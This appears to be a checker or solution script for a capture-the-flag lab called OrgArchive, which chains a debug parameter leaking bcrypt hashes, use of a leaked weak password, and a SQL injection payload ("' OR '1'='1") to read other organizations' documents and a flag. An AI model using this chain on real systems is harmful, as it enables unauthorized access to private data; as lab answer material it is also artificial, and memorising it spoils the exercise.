#!/usr/bin/env python3
"""Exercise the OrgArchive chain through its public gateway."""
import base64
import json
import os
import time
import uuid

import bcrypt
import requests

BASE = os.getenv('GATEWAY_URL', 'http://localhost:8080')

def credentials(username, password):
    encoded = base64.b64encode(f'{username}:{password}'.encode()).decode()
    return {'Authorization': 'Basic ' + encoded}

def call(method, path, expected, username=None, password=None, **kwargs):
    headers = credentials(username, password) if username is not None else {}
    for attempt in range(10):
        try:
            response = requests.request(method, BASE + path, headers=headers, timeout=15, **kwargs)
            if response.status_code in (500, 502, 503) and attempt < 9:
                time.sleep(1)
                continue
            break
        except requests.exceptions.ConnectionError:
            if attempt == 9:
                raise
            time.sleep(1)
    assert response.status_code == expected, (path, response.status_code, response.text[:300])
    return response.json() if response.content and expected in (200, 201) else None

api = call('GET', '/', 200)
assert api['service'] == 'OrgArchive'
assert {'/signup', '/users', '/notes'} <= {item['path'] for item in api['endpoints']}
call('GET', '/users', 401)
call('GET', '/notes', 401)
username = 'user-' + uuid.uuid4().hex[:10]
password = 'UserPass!' + uuid.uuid4().hex[:12]
account = call('POST', '/signup', 201, json={
    'username': username, 'displayName': 'Demo User',
    'email': username + '@example.test', 'password': password,
})
organization = account['organization']
assert organization.startswith('trial-')
assert call('GET', f'/organizations/{organization}/notes', 200, username, password) == []
users = call('GET', '/users', 200, username, password)
assert users and any(user['username'] == 'anna' for user in users)
assert any(user['role'] == 'admin' for user in users)
debug_users = call('GET', '/users?debug=true', 200, username, password)
assert all(user['passwordHash'].startswith(('$2a$', '$2b$', '$2y$')) for user in debug_users)
anna = next(user for user in debug_users if user['username'] == 'anna')
assert anna['passwordHash'].startswith(('$2a$', '$2b$', '$2y$'))
anna_password = 'sunshine'
assert bcrypt.checkpw(anna_password.encode(), anna['passwordHash'].encode())
normal = call('POST', '/documents/search', 200, 'anna', anna_password,
              json={'organization': 'atlas-consulting'})
assert normal and {json.loads(doc['metadata'])['organization'] for doc in normal} == {'atlas-consulting'}
assert call('POST', '/documents/search', 200, 'anna', anna_password,
            json={'organization': 'harbor-delivery'}) == []
payload = "atlas-consulting' OR '1'='1"
injected = call('POST', '/documents/search', 200, 'anna', anna_password,
                json={'organization': payload})
organizations = {json.loads(doc['metadata'])['organization'] for doc in injected}
assert {'atlas-consulting', 'harbor-delivery', 'cedar-partners', 'siteworks-group',
        'meridian-legal'} <= organizations
assert any('FLAG{archive-isolation-broken-by-converter}' in doc['content'] for doc in injected)
assert call('POST', '/documents/search-safe', 200, 'anna', anna_password,
            json={'organization': payload}) == []
print('OrgArchive chain OK: signup, method authorization bypass, debug hash, SQL injection')
